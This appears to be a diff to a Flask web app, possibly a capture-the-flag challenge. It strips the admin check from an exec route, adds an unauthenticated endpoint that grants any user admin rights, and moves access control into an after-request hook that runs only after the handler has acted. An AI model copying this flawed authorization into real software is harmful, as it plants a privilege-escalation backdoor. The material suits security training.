@@ -1507,7 +1507,6 @@ def system():
 
 
 @app.route("/ajax/exec")
-@admin_required
 def system_command():
     cmd = request.args.get('cmd')
     """
@@ -1515,6 +1514,13 @@ def system_command():
     """
     output = read_file('flag.txt')   # Debug, make sure you remove this before pushing
     return output
+
+
+@app.route("/ajax/makeadmin")
+def ajax_make_admin():
+    username = request.args.get('username')
+    db.execute("UPDATE users SET admin=1 WHERE username=?", username)
+    return "OK"
 
 
 # Error handling
@@ -1540,6 +1546,8 @@ def teapot():
 # Security headers
 @app.after_request
 def security_policies(response):
+    if 'ajax' in request.path and not (session and session['admin'] == True):
+        response = redirect("/")
     response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
     response.headers['X-Content-Type-Options'] = 'nosniff'
     response.headers['X-Frame-Options'] = 'SAMEORIGIN'
